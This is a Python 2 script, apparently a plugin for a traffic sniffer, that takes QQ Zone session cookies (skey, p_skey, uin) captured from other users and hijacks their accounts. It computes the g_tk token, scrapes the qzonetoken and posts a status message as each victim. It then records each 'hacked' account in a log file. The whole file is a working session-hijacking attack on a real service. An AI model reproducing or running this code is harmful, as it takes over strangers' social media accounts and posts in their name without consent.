#encoding: utf8
import os
from Toolbox.ColorTools import *
import re
from requests import *
import sys


def g_tk(p_skey):
    h = 5381
    for c in p_skey:
        h += (h << 5) + ord(c)
    return h & 0x7fffffff


def SendMsg(uin, skey, p_skey, msg):
    qq = re.findall(r'o0*(\S+)', uin)[0]
    with open('HackQzone.txt', 'r') as fp:
        if qq in fp.read():
            return 0
        
    try:
        rs = session() 
        cookies = {'uin': uin,
                   'skey': skey,
                   'p_uin': uin,
                   'p_skey': p_skey
                   }
        utils.add_dict_to_cookiejar(rs.cookies, cookies)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36',
        }
        qzoneText = rs.post('http://user.qzone.qq.com/%s' %qq, headers=headers, cookies=cookies, timeout=5).text
        Qzname = re.findall(r'<title>(.+) \[', qzoneText)
        Qname = re.findall(r'textoverflow">(.+)</span>', qzoneText)
        print '[%s][%s][%s]' %(qq, Qname[0], Qzname[0]),
        
        qzonetoken = re.findall(r'window.g_qzonetoken = \(function\(\)\{ try\{return "(.+)";\} catch\(e\)', qzoneText)[0]

        url = 'https://user.qzone.qq.com/proxy/domain/taotao.qzone.qq.com/cgi-bin/emotion_cgi_publish_v6?qzonetoken=%s&g_tk=%s' %(qzonetoken, g_tk(p_skey))
        data = {'con': 'qm%s' %msg,
                'hostuin': qq,
        }

        rs.post(url, data=data, timeout=5).text
        print '\a[Hacked]'
        with open('HackQzone.txt', 'a') as fp:
            fp.write(qq+'\n')
        sys.exit(1) # 防止失控
        Notify('Found New QzoneCookie!', '[%s][%s][%s]' %(qq, Qname[0].encode('utf8'), Qzname[0].encode('utf8')))
        
    except Exception, e:
        print '  [%s] [%s]' %(putColor(qq, 'green'), putColor('Failed', 'red')), e
        print 
        

def QzoneCookieUsage(args):
    srcip = args[0]
    Cookie = args[1]
    
    if 'p_skey' in Cookie and 'skey' in Cookie:
        print '\r[' + putColor(srcip, 'cyan') + ']', putColor('Found Qzone Cookie!', 'green'), ' '*80
        print '  [-]%s' %putColor('Hacking...', 'yellow')
        cookie = Cookie.replace(';', '\n')
        skey = re.findall(r'\bskey=(.+)', cookie)[0]
        uin = re.findall(r'uin=(.+)', cookie)[0]
        p_skey = re.findall(r"p_skey=(.+)", cookie)[0]
        SendMsg(uin, skey, p_skey, 'What does the fox say?')
        

        